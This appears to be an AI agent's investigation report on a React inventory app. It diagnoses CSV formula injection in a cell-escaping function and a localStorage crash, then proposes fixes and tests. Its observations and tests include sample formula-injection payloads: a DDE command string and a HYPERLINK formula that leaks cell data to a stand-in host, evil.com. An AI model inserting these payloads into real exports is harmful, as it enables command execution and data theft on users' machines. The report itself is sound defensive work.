# Explorer 3 Investigation & Remediation Report: CSV Security & Storage Resilience

**Agent**: Explorer 3 (`explorer_m1_r2_3`)  
**Role**: Read-only investigation and synthesis specialist  
**Date**: 2026-11-10T00:52:00Z  
**Target Milestone**: Milestone 1 Remediation (CSV Security & Storage Resilience)  
**Working Directory**: `/home/arsyirazeim/Downloads/Project_Raisyah/.agents/teamwork/explorer_m1_r2_3`  
**Target Files Analyzed**:
- `src/utils/inventoryLogic.ts` (lines 389–482)
- `src/App.tsx` (lines 20–80)
- `tests/helpers/testStorage.ts` (lines 70–98)
- `src/utils/inventoryLogic.test.ts` (lines 208–236)
- `tests/tier1_features.test.ts` (lines 740–786)
- `tests/tier2_boundaries.test.ts` (lines 108–121, 237–248)

---

## 1. Observation

### 1.1 Defect 1: CSV Formula Injection (CWE-1236) in `src/utils/inventoryLogic.ts`

#### A. Verbatim Source Inspection
In `src/utils/inventoryLogic.ts` (lines 389–396):
```ts
export function escapeCsvCell(val: string | number | undefined | null): string {
  if (val === undefined || val === null) return '""';
  const str = String(val);
  if (str.includes(',') || str.includes('"') || str.includes('\n') || str.includes('\r')) {
    return `"${str.replace(/"/g, '""')}"`;
  }
  return `"${str}"`;
}
```

#### B. Empirical Test Verification
Executing `escapeCsvCell` against typical formula injection payloads yields:
```bash
$ npx tsx -e '
import { escapeCsvCell } from "./src/utils/inventoryLogic.ts";
console.log("=cmd:", escapeCsvCell("=cmd|\x27 /C calc\x27!A0"));
console.log("+SUM:", escapeCsvCell("+SUM(A1:A10)"));
console.log("-10:", escapeCsvCell("-10"));
console.log("@admin:", escapeCsvCell("@admin"));
'
```
**Actual Output**:
```text
=cmd: "=cmd|' /C calc'!A0"
+SUM: "+SUM(A1:A10)"
-10: "-10"
@admin: "@admin"
```

**Observation Details**:
1. All spreadsheet formula trigger prefixes (`=`, `+`, `-`, `@`) remain intact at the beginning of the cell string.
2. In RFC 4180 CSV specifications, surrounding a field with double quotes does **not** stop spreadsheet applications (Microsoft Excel, LibreOffice Calc, Apple Numbers, Google Sheets) from parsing and evaluating the cell content as an active formula or command.
3. If an inventory item name, notes field, location, member name, or loan purpose contains formula elements (e.g. `=cmd|'/C calc'!A0`, `@SUM(A1:B2)`, `=HYPERLINK("https://evil.com/leak?data="&A1, "Click")`), opening the exported CSV in Excel triggers formula execution, DDE command execution, or data exfiltration.

---

### 1.2 Defect 2: Malformed / Non-Array JSON in localStorage Causes Fatal TypeError White-Screen

#### A. Verbatim Source Inspection in `src/App.tsx` (lines 20–47)
```tsx
  const [items, setItems] = useState<InventoryItem[]>(() => {
    try {
      const saved = localStorage.getItem('sipraka_items_v3');
      return saved ? JSON.parse(saved) : INITIAL_INVENTORY_ITEMS;
    } catch {
      return INITIAL_INVENTORY_ITEMS;
    }
  });

  const [members, setMembers] = useState<ScoutMember[]>(() => {
    try {
      const saved = localStorage.getItem('sipraka_members_v3');
      return saved ? JSON.parse(saved) : INITIAL_MEMBERS;
    } catch {
      return INITIAL_MEMBERS;
    }
  });

  const [currentMemberId, setCurrentMemberId] = useState<string>(INITIAL_MEMBERS[0].id);

  const [transactions, setTransactions] = useState<LoanTransaction[]>(() => {
    try {
      const saved = localStorage.getItem('sipraka_tx_v3');
      return saved ? JSON.parse(saved) : INITIAL_TRANSACTIONS;
    } catch {
      return INITIAL_TRANSACTIONS;
    }
  });
```

And in `src/App.tsx` (lines 79–81):
```tsx
  const currentMember =
    members.find((m) => m.id === currentMemberId) || members[0];
```

#### B. Verbatim Source Inspection in `tests/helpers/testStorage.ts` (lines 73–94)
```ts
  public loadFromStorage(): void {
    try {
      const savedItems = this.storage.getItem('sipraka_items_v3');
      this.items = savedItems ? JSON.parse(savedItems) : JSON.parse(JSON.stringify(INITIAL_INVENTORY_ITEMS));
    } catch {
      this.items = JSON.parse(JSON.stringify(INITIAL_INVENTORY_ITEMS));
    }

    try {
      const savedMembers = this.storage.getItem('sipraka_members_v3');
      this.members = savedMembers ? JSON.parse(savedMembers) : JSON.parse(JSON.stringify(INITIAL_MEMBERS));
    } catch {
      this.members = JSON.parse(JSON.stringify(INITIAL_MEMBERS));
    }

    try {
      const savedTx = this.storage.getItem('sipraka_tx_v3');
      this.transactions = savedTx ? JSON.parse(savedTx) : JSON.parse(JSON.stringify(INITIAL_TRANSACTIONS));
    } catch {
      this.transactions = JSON.parse(JSON.stringify(INITIAL_TRANSACTIONS));
    }
  }
```

#### C. Empirical Reproduction of Storage Crash
```bash
$ npx tsx -e '
import { MockLocalStorage, SiPrakaStateStore } from "./tests/helpers/testStorage.ts";

const storage = new MockLocalStorage();
storage.setItem("sipraka_items_v3", "null");
const store = new SiPrakaStateStore(storage);
console.log("Current store.getItems() with null in storage:", store.getItems());
console.log("Is array:", Array.isArray(store.getItems()));
try {
  store.getItems().filter(Boolean);
} catch (e) {
  console.log("Fatal crash:", e.message);
}
'
```
**Actual Output**:
```text
Current store.getItems() with null in storage: null
Is array: false
Fatal crash: Cannot read properties of null (reading 'filter')
```

**Observation Details**:
1. When `localStorage.getItem` returns `"null"`, `"{}"`, `"123"`, `"true"`, or `"\"corrupted\""`:
   - `JSON.parse` evaluates valid JSON primitives / objects and does **not** throw a `SyntaxError`.
   - The `catch` block is bypassed.
   - The ternary `saved ? JSON.parse(saved) : ...` returns `null`, `{}`, `123`, `true`, or `"corrupted"`.
2. As a consequence:
   - `items` is initialized to `null` or `{}` instead of `InventoryItem[]`.
   - `members` is initialized to `null` or `{}` instead of `ScoutMember[]`.
   - `transactions` is initialized to `null` or `{}` instead of `LoanTransaction[]`.
3. In `App.tsx` line 80:
   `members.find(...)` throws `TypeError: members.find is not a function`.
4. In `MemberMobileApp.tsx`:
   Expressions such as `items.map(...)`, `items.filter(...)`, and `items[0]` immediately throw uncaught runtime exceptions (`TypeError: items.filter is not a function`), unmounting the entire React tree and leaving the user with an unrecoverable blank white screen.
5. In `tests/tier2_boundaries.test.ts:108` (`B5`), test coverage only tested malformed JSON syntax (`'{corrupted'`, `'[unclosed'`, `'null undefined'`). Because those threw `SyntaxError`, the test passed, but completely masked this fatal flaw when valid non-array JSON is stored.

---

## 2. Logic Chain

### 2.1 Logic Chain: CSV Formula Injection (CWE-1236)
1. **Premise 1**: SiPraka allows users (Dewan Inventaris and Scout members) to input free-text data into fields such as inventory item names, categories, locations, notes, borrower names, classes, and loan purposes.
2. **Premise 2**: Feature 9 (`exportInventoryToCsv` and `exportTransactionsToCsv`) serializes these records into CSV files for export and download.
3. **Premise 3**: Spreadsheet applications (Excel, Calc, Sheets) treat cells whose string starts with `=`, `+`, `-`, or `@` as active executable formulas or DDE command invocations, even when enclosed in standard RFC 4180 double quotes `""`.
4. **Premise 4**: `escapeCsvCell` in `src/utils/inventoryLogic.ts` only double-escaped `"` and wrapped strings in `"..."`, leaving the leading trigger character as the first character of the parsed cell value.
5. **Deduction**: An attacker or innocent user inputting `=cmd|'/C calc'!A0`, `@SUM(...)`, or `+62812...` triggers formula execution upon opening the exported CSV.
6. **Remediation Requirement**: According to OWASP CSV Injection guidelines and the project specification, prepending a single quote (`'`) to any cell value that starts with `/^[=+\-@]/` forces spreadsheet parsers to interpret the cell as literal text, completely disabling formula evaluation while displaying the text accurately.

### 2.2 Logic Chain: LocalStorage Non-Array Corruption White-Screen
1. **Premise 1**: Web browsers share `localStorage` with other scripts, extensions, or past application states. Storage keys can become populated with `"null"` (from `JSON.stringify(null)` or a cleared item), `"{}"`, primitive numbers, or strings.
2. **Premise 2**: `JSON.parse("null") === null`, `JSON.parse("{}")` is `{}` (object), `JSON.parse("123") === 123` (number). None of these throw an error.
3. **Premise 3**: `App.tsx` used `try { const saved = localStorage.getItem(...); return saved ? JSON.parse(saved) : INITIAL_*; } catch { return INITIAL_*; }`.
4. **Premise 4**: Because `JSON.parse` does not throw on valid non-array JSON, the state variables `items`, `members`, and `transactions` are set to `null`, `{}`, or numbers.
5. **Premise 5**: React components (`App.tsx`, `MemberMobileApp.tsx`) immediately invoke Array prototype methods (`.map()`, `.filter()`, `.find()`, `.reduce()`) during initial render.
6. **Deduction**: Calling Array prototype methods on `null` or `{}` causes a fatal `TypeError` during React render, crashing the app into an unrecoverable blank white screen on page load.
7. **Remediation Requirement**: An explicit `Array.isArray(parsed)` guard must be evaluated before accepting stored data. If `Array.isArray(parsed)` is `false`, the system must discard the invalid data and safely fallback to `INITIAL_*` constants.

---

## 3. Caveats

1. **Other Milestones & Responsibilities**:
   - Deletion safety (`handleDeleteItem` guard in `App.tsx` and disabling "Ya, Hapus" in `MemberMobileApp.tsx`) and Cart quantity clamping are assigned to Explorer 1 / Worker remediation streams and were reviewed in `reviewer_m1_2` / `challenger_m1_1`. This report specifically targets CSV Injection (CWE-1236) and LocalStorage Non-Array Resilience.
2. **Numbers in CSV Exports**:
   - Numeric quantities (`item.totalQty`, `item.borrowedQty`, `item.damagedQty`, `available`, `totalUnits`) are passed directly as numbers in `exportInventoryToCsv` and `exportTransactionsToCsv`. They do not begin with `=`, `+`, `-`, or `@` (as quantities are non-negative integers).
   - If `escapeCsvCell` is called with negative numbers (e.g. `escapeCsvCell(-5)`), converting to string yields `"-5"`, which begins with `-`. Prepending `'` converts it to `'"\'-5"'`, which Excel safely displays as text `'-5`, avoiding formula interpretation.
3. **Leading Hyphen in Default Placeholders (`'-'`)**:
   - In `exportInventoryToCsv`: `escapeCsvCell(item.notes || '-')`
   - In `exportTransactionsToCsv`: `escapeCsvCell(tx.returnDate || '-')`
   - When a note or return date is not present, `'-'` begins with `-`. Escaping it produces `'"\'-\"'`. In Excel, this displays cleanly as `'-'` without attempting subtraction formula execution.
4. **Test Harness Alignment**:
   - `tests/helpers/testStorage.ts` is the mock storage used by the automated test suite (`tests/tier1_features.test.ts`, `tests/tier2_boundaries.test.ts`, etc.).
   - To prevent test/production disparity, the same `Array.isArray` check must be applied to `tests/helpers/testStorage.ts::loadFromStorage`.

---

## 4. Conclusion & Recommended Fix Strategies

### 4.1 Fix Recommendation 1: Neutralize Formula Injection in `src/utils/inventoryLogic.ts`

#### Exact Location
`src/utils/inventoryLogic.ts`, lines 389–396.

#### Proposed Code Replacement
```ts
/**
 * Helper to escape CSV cell contents according to RFC 4180
 * and sanitize against formula injection (CWE-1236).
 * Prepend single quote (') if the text begins with '=', '+', '-', or '@'.
 */
export function escapeCsvCell(val: string | number | undefined | null): string {
  if (val === undefined || val === null) return '""';
  let str = String(val);

  // Neutralize CSV formula injection (CWE-1236) for spreadsheet parsers
  if (/^[=+\-@]/.test(str)) {
    str = `'${str}`;
  }

  return `"${str.replace(/"/g, '""')}"`;
}
```

#### Rationale
- Checks `/^[=+\-@]/.test(str)`. If true, prepends `'`.
- Replaces double quotes with `""` per RFC 4180.
- Wraps entire cell in `"`...`"`.
- Simplifies logic: regardless of whether commas/quotes exist, all string cells are safely enclosed in RFC 4180 quotes.
- When imported into Excel or LibreOffice Calc, the leading apostrophe tells the spreadsheet parser to treat the cell as string literal text, preventing formula and macro execution.

---

### 4.2 Fix Recommendation 2: Robust LocalStorage Recovery in `src/App.tsx` and `tests/helpers/testStorage.ts`

#### Exact Location in `src/App.tsx`
`src/App.tsx`, lines 20–47.

#### Proposed Code Replacement in `src/App.tsx`
Add a resilient loader helper function and use it for `items`, `members`, and `transactions`:
```tsx
/**
 * Helper to safely load array state from localStorage.
 * Ensures that non-array valid JSON (e.g. "null", "{}", "123", "\"corrupted\"")
 * or syntax errors fall back cleanly to default constants without throwing TypeError.
 */
function loadStorageArray<T>(key: string, fallback: T[], requireNonEmpty = false): T[] {
  try {
    const saved = localStorage.getItem(key);
    if (!saved) return fallback;
    const parsed = JSON.parse(saved);
    if (!Array.isArray(parsed)) return fallback;
    if (requireNonEmpty && parsed.length === 0) return fallback;
    return parsed;
  } catch {
    return fallback;
  }
}
```

And update state initializers:
```tsx
  const [items, setItems] = useState<InventoryItem[]>(() =>
    loadStorageArray('sipraka_items_v3', INITIAL_INVENTORY_ITEMS)
  );

  const [members, setMembers] = useState<ScoutMember[]>(() =>
    loadStorageArray('sipraka_members_v3', INITIAL_MEMBERS, true)
  );

  const [currentMemberId, setCurrentMemberId] = useState<string>(INITIAL_MEMBERS[0].id);

  const [transactions, setTransactions] = useState<LoanTransaction[]>(() =>
    loadStorageArray('sipraka_tx_v3', INITIAL_TRANSACTIONS)
  );
```

#### Proposed Code Replacement in `tests/helpers/testStorage.ts` (lines 73–94)
Update `loadFromStorage` to mirror production logic:
```ts
  public loadFromStorage(): void {
    try {
      const savedItems = this.storage.getItem('sipraka_items_v3');
      const parsed = savedItems ? JSON.parse(savedItems) : null;
      this.items = Array.isArray(parsed)
        ? parsed
        : JSON.parse(JSON.stringify(INITIAL_INVENTORY_ITEMS));
    } catch {
      this.items = JSON.parse(JSON.stringify(INITIAL_INVENTORY_ITEMS));
    }

    try {
      const savedMembers = this.storage.getItem('sipraka_members_v3');
      const parsed = savedMembers ? JSON.parse(savedMembers) : null;
      this.members = Array.isArray(parsed) && parsed.length > 0
        ? parsed
        : JSON.parse(JSON.stringify(INITIAL_MEMBERS));
    } catch {
      this.members = JSON.parse(JSON.stringify(INITIAL_MEMBERS));
    }

    try {
      const savedTx = this.storage.getItem('sipraka_tx_v3');
      const parsed = savedTx ? JSON.parse(savedTx) : null;
      this.transactions = Array.isArray(parsed)
        ? parsed
        : JSON.parse(JSON.stringify(INITIAL_TRANSACTIONS));
    } catch {
      this.transactions = JSON.parse(JSON.stringify(INITIAL_TRANSACTIONS));
    }
  }
```

#### Rationale
- Handles `null` (key missing), `""` (empty string), `"{invalid"` (SyntaxError), `"null"`, `"{}"`, `"123"`, `"true"`, and `"\"corrupted\""` without throwing.
- For `members`, `requireNonEmpty: true` guarantees that `members[0]` is always defined, preventing `TypeError` on line 80 (`currentMember = members.find(...) || members[0]`).
- Clean, DRY, maintainable, and type-safe.

---

### 4.3 Proposed Test Additions

#### 1. In `src/utils/inventoryLogic.test.ts`
Add after line 215:
```ts
test('escapeCsvCell sanitizes formula injection triggers (=, +, -, @) per CWE-1236', () => {
  assert.equal(escapeCsvCell('=1+1'), '"\'=1+1"');
  assert.equal(escapeCsvCell('+SUM(A1:A10)'), '"\'+SUM(A1:A10)"');
  assert.equal(escapeCsvCell('-15'), '"\'-15"');
  assert.equal(escapeCsvCell('@admin'), '"\'@admin"');
  assert.equal(escapeCsvCell("=cmd|' /C calc'!A0"), '"\'=cmd|\' /C calc\'!A0"');
  assert.equal(escapeCsvCell('=cmd|" /C calc"!A0'), '"\'=cmd|"" /C calc""!A0"');
  // Safe string should not be prepended with single quote
  assert.equal(escapeCsvCell('Tongkat Pramuka'), '"Tongkat Pramuka"');
});
```

#### 2. In `tests/tier2_boundaries.test.ts`
Add after line 121 (extending `B5`):
```ts
test('B5.2: non-array valid JSON (null, {}, 123, "string", true) in localStorage recovers cleanly to seed data', () => {
  const malformedValues = ['null', '{}', '123', '"corrupted"', 'true', ''];
  for (const malformed of malformedValues) {
    const storage = new MockLocalStorage();
    storage.setItem('sipraka_items_v3', malformed);
    storage.setItem('sipraka_members_v3', malformed);
    storage.setItem('sipraka_tx_v3', malformed);

    const store = new SiPrakaStateStore(storage);
    assert.ok(Array.isArray(store.getItems()), `getItems must return an array for ${malformed}`);
    assert.equal(store.getItems().length, INITIAL_INVENTORY_ITEMS.length);
    assert.ok(Array.isArray(store.getMembers()), `getMembers must return an array for ${malformed}`);
    assert.equal(store.getMembers().length, 4);
    assert.ok(Array.isArray(store.getTransactions()), `getTransactions must return an array for ${malformed}`);
    assert.equal(store.getTransactions().length, 5);

    // Verify array methods run safely without throwing TypeError
    assert.doesNotThrow(() => {
      store.getItems().filter((i) => i.totalQty > 0);
      store.getMembers().map((m) => m.name);
      store.getTransactions().filter((t) => t.status === 'active_borrowed');
    });
  }
});
```

---

## 5. Verification Method

### 5.1 Independent CLI Verification Commands

1. **Verify CSV Formula Sanitization**:
   ```bash
   node -e '
   function escapeCsvCell(val) {
     if (val === undefined || val === null) return "\"\"";
     let str = String(val);
     if (/^[=+\-@]/.test(str)) {
       str = "\x27" + str;
     }
     return `"${str.replace(/"/g, "\"\"")}"`;
   }

   const inputs = ["=1+1", "+SUM(A1)", "-10", "@admin", "=cmd|\x27 /C calc\x27!A0"];
   for (const input of inputs) {
     const out = escapeCsvCell(input);
     if (!out.startsWith("\"\'")) throw new Error("Failed sanitization for " + input);
   }
   console.log("ALL CSV FORMULA TESTS PASSED");
   '
   ```

2. **Verify LocalStorage Non-Array Recovery**:
   ```bash
   node -e '
   function loadStorageArray(saved, fallback, requireNonEmpty = false) {
     try {
       if (!saved) return fallback;
       const parsed = JSON.parse(saved);
       if (!Array.isArray(parsed)) return fallback;
       if (requireNonEmpty && parsed.length === 0) return fallback;
       return parsed;
     } catch {
       return fallback;
     }
   }

   const fallback = [{ id: "seed" }];
   const badValues = ["null", "{}", "123", "\"corrupted\"", "true", "", "{corrupted:json"];
   for (const bad of badValues) {
     const res = loadStorageArray(bad, fallback);
     if (!Array.isArray(res) || res[0].id !== "seed") throw new Error("Failed fallback for: " + bad);
   }
   console.log("ALL STORAGE RECOVERY TESTS PASSED");
   '
   ```

3. **Verify Full Baseline Test & Build Health**:
   ```bash
   npm run lint
   npm run build
   npx tsx --test src/utils/inventoryLogic.test.ts
   npx tsx --test tests/*.test.ts
   ```

### 5.2 Invalidation Conditions
- If `escapeCsvCell('=1+1')` returns `'"=1+1"'` (without leading single quote `'`), CWE-1236 formula injection remains unmitigated.
- If `localStorage.getItem('sipraka_items_v3')` set to `"null"` causes `Array.isArray(items)` to evaluate to `false`, the white-screen defect remains present.
